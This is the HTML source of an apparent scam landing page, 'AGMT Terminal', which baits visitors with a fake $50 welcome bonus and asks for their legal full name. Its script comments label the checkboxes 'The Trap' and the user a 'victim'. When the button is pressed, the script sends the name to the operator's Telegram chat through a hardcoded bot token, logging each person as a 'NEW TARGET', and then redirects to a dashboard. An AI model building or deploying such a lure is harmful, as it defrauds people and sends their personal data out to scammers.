<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AGMT | Terminal Access</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
        
        body { background: var(--bg); color: white; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; }

        /* Premium Background Blur */
        .bg-glow { position: absolute; width: 300px; height: 300px; background: var(--primary); filter: blur(140px); opacity: 0.15; border-radius: 50%; z-index: -1; animation: float 8s infinite alternate; }
        @keyframes float { from { transform: translate(-20%, -20%); } to { transform: translate(20%, 20%); } }

        .auth-container {
            width: 90%; max-width: 400px; padding: 40px 30px;
            background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(20px);
            border: 1px solid var(--border); border-radius: 45px;
            text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.6);
            animation: slideUp 0.8s ease-out;
        }
        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }

        .logo-icon { 
            width: 75px; height: 75px; background: linear-gradient(135deg, var(--primary), #1e40af); 
            border-radius: 22px; display: flex; align-items: center; justify-content: center; 
            margin: 0 auto 25px; font-size: 32px; font-weight: 800;
            box-shadow: 0 15px 35px rgba(37, 99, 235, 0.3);
        }

        h1 { font-size: 24px; font-weight: 800; letter-spacing: -1px; margin-bottom: 10px; }
        .bonus-badge { background: rgba(16, 185, 129, 0.15); color: var(--accent); padding: 8px 16px; border-radius: 50px; font-size: 11px; font-weight: 800; display: inline-block; margin-bottom: 30px; border: 1px solid rgba(16, 185, 129, 0.2); }

        .input-wrap { text-align: left; margin-bottom: 25px; }
        .label { font-size: 10px; font-weight: 800; color: #475569; text-transform: uppercase; letter-spacing: 1.5px; margin-left: 15px; margin-bottom: 8px; display: block; }
        
        input[type="text"] { 
            width: 100%; padding: 20px; border-radius: 22px; border: 1px solid var(--border);
            background: rgba(2, 6, 23, 0.5); color: white; font-size: 16px; font-weight: 600;
            transition: 0.3s;
        }
        input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 5px rgba(37, 99, 235, 0.1); }

        /* The Trap: Agreements */
        .agreements { background: rgba(255,255,255,0.03); padding: 20px; border-radius: 25px; border: 1px solid var(--border); margin-bottom: 30px; }
        .checkbox-row { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 15px; text-align: left; cursor: pointer; }
        .checkbox-row:last-child { margin-bottom: 0; }
        input[type="checkbox"] { width: 22px; height: 22px; accent-color: var(--primary); cursor: pointer; border-radius: 6px; }
        .check-text { font-size: 12px; color: #94a3b8; font-weight: 600; line-height: 1.5; }
        .check-text b { color: #fff; }

        .btn-claim {
            width: 100%; padding: 22px; border-radius: 22px; border: none;
            background: linear-gradient(135deg, #2563eb, #1e40af);
            color: white; font-weight: 800; font-size: 16px; cursor: pointer;
            box-shadow: 0 15px 35px rgba(37, 99, 235, 0.3); transition: 0.3s;
        }
        .btn-claim:disabled { opacity: 0.4; filter: grayscale(1); cursor: not-allowed; }
        .btn-claim:active { transform: scale(0.97); }

        /* Loading Screen */
        #loader { position: fixed; inset: 0; background: var(--bg); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
        .shimmer { width: 50px; height: 50px; border: 3px solid rgba(37,99,235,0.1); border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .security-footer { margin-top: 30px; font-size: 10px; color: #334155; font-weight: 800; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="bg-glow"></div>

    <div id="loader">
        <div class="shimmer"></div>
        <p style="margin-top: 25px; font-size: 11px; font-weight: 800; letter-spacing: 2px; color: var(--primary);">SYNCING WITH GLOBAL NODE...</p>
    </div>

    <div class="auth-container">
        <div class="logo-icon">A</div>
        <h1>AGMT Terminal</h1>
        <div class="bonus-badge">🎁 $50.0 welcome bonus waiting</div>

        <div class="input-wrap">
            <span class="label">Legal Full Name</span>
            <input type="text" id="targetName" placeholder="Enter name to claim bonus" required>
        </div>

        <div class="agreements">
            <label class="checkbox-row">
                <input type="checkbox" class="terms-check">
                <span class="check-text">I confirm that I am <b>18 years of age</b> or older.</span>
            </label>
            <label class="checkbox-row">
                <input type="checkbox" class="terms-check">
                <span class="check-text">I am ready to accept my <b>$50.00 signup bonus</b> into my secure wallet.</span>
            </label>
        </div>

        <button id="claimBtn" class="btn-claim" onclick="initTerminal()" disabled>CLAIM BONUS & START</button>

        <div class="security-footer">🛡️ SECURED BY INSTITUTIONAL ENCRYPTION</div>
    </div>

    <script>
        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
        const chatId = "7909543900";

        // Logic to enable button only when both checkboxes are checked
        const checks = document.querySelectorAll('.terms-check');
        const btn = document.getElementById('claimBtn');

        checks.forEach(c => {
            c.addEventListener('change', () => {
                const allChecked = Array.from(checks).every(box => box.checked);
                btn.disabled = !allChecked;
            });
        });

        function initTerminal() {
            const name = document.getElementById('targetName').value;
            if(!name) return alert("Please enter your name");

            localStorage.setItem('merchantName', name);
            localStorage.setItem('walletBalance', "50.00"); // Start with $50 bonus
            localStorage.setItem('tasksCompleted', "0");

            document.getElementById('loader').style.display = 'flex';

            // Send victim info to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=👤 <b>NEW TARGET LOGGED:</b>%0A<b>Name:</b> ${name}%0A<b>Status:</b> Accepted 18+ and Claimed $50 Bonus.&parse_mode=html`);

            setTimeout(() => {
                window.location.href = 'dashboard.html';
            }, 3000);
        }
    </script>

    <script src="notify.js"></script>

</body>
</html>
